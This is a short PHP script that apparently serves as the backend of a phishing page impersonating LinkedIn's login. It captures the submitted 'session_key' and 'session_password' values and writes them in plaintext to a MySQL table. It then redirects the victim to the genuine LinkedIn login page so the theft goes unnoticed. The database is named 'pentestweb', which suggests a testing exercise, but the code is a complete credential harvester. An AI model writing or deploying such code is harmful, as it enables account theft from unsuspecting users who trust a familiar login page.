<?php


//var_dump($_SERVER["REQUEST_METHOD"]);
//print_r($_POST);

if ($_SERVER["REQUEST_METHOD"] == "POST") {
    if ($_POST["session_key"] != "" AND $_POST["session_password"] != "") {


        $conn = new PDO("mysql:host=localhost;dbname=pentestweb", 'root', '');

        $conn->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);
        echo "Connected successfully";
        $stmt =  $conn->prepare(' INSERT INTO tb_usuario(LOGIN_US,SENHA_US) VALUES(? , ?) ');
        $stmt->execute(array ( $_POST["session_key"], $_POST["session_password"]));
        // echo "feito";	
        header("Location:https://www.linkedin.com/login/pt");
    }else{
       header("Location:/");
    }
    
}else{
    die("");
}

?>